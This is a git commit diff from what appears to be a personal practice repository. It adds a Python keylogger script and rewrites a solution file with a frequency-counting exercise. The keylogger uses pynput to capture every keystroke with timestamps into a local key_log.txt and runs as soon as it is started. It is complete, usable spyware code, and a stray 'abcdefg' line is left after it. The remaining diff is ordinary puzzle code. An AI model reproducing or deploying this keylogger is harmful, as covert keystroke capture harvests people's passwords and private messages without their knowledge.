5db7546d499cf4803515a7091d73f7d4249c1e6a
viswanathanTJ <viswanathantj@gmail.com>
2022-04-18 19:03:49 +0530

    logging

---
+++ Python/Scripts/keylogger.py
@@ -0,0 +1,15 @@
+import logging
+import os
+from pynput.keyboard import Listener
+
+log_Directory = os.getcwd() + '/'
+print(os.getcwd())
+logging.basicConfig(filename=(log_Directory + "key_log.txt"),
+                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(key)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+abcdefg
--- Python/solution.py
+++ Python/solution.py
@@ -1,17 +1,28 @@
-s = input()
-r = s[::-1]
-res = 0
-for i in range(len(s)):
-    if s[i] == r[i]:
-        res += 1
-print(res)
-
-# Number
-s = input().split()
-fi, se, th, fo = float('inf'), float('-inf'), float('inf'), float('-inf')
-for i in s:
-    fi = min(fi, int(i[0]))
-    se = max(se, int(i[1]))
-    th = min(th, int(i[2]))
-    fo = max(fo, int(i[3]))
-print(f'{fi}{se}{th}{fo}')
+T = int(input())
+for _ in range(T):
+    n, ar = int(input()), list(map(int, input().split(' ')))
+    d = {}
+    for x in ar:
+        if x not in d:
+            d[x] = 0
+        d[x] += 1
+    maxElem, k = -99999, 0
+    for x in set(ar):
+        if k < d[x]:
+            maxElem = x
+            k = d[x]
+    # temp = []
+    print(maxElem, k)
+    start = 0
+    res = 0
+    # count = 0
+    for x in ar:
+        if k == 0:
+            break
+        if x == maxElem:
+            start = 1
+        if start:
+            res += 1
+            if x == maxElem:
+                k -= 1
+    print(res)
